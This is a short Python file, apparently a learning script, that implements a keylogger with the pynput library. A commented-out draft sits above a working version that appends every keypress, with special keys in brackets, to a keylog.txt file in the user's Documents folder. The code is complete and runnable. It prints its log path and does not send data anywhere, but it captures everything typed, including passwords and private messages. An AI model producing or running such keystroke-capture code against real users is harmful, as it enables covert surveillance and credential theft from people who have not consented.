# from pynput import keyboard

# def keypressed(key):
#     print(str(key))
#     with open("keyfile.txt", 'a') as logkey:
#         try:
#             char = key.char
#             logkey.write(char)
#         except:
#             print("Error getting char")               
# if __name__ == "__main__":
#     listener =  keyboard.Listener(on_press=keypressed)
#     listener.start()
#     input()

from pynput import keyboard
import os

# Define a safe path for logging
log_file_path = os.path.expanduser("~\\Documents\\keylog.txt")

def keypressed(key):
    try:
        # Try to get the character representation
        char = key.char
        with open(log_file_path, 'a') as logkey:
            logkey.write(char)
    except AttributeError:
        # Handle special keys (e.g., Key.enter, Key.space)
        with open(log_file_path, 'a') as logkey:
            logkey.write(f'[{key.name}]')
    except Exception as e:
        print(f"Logging error: {e}")

if __name__ == "__main__":
    print(f"Logging keys to: {log_file_path}")
    with keyboard.Listener(on_press=keypressed) as listener:
        listener.join()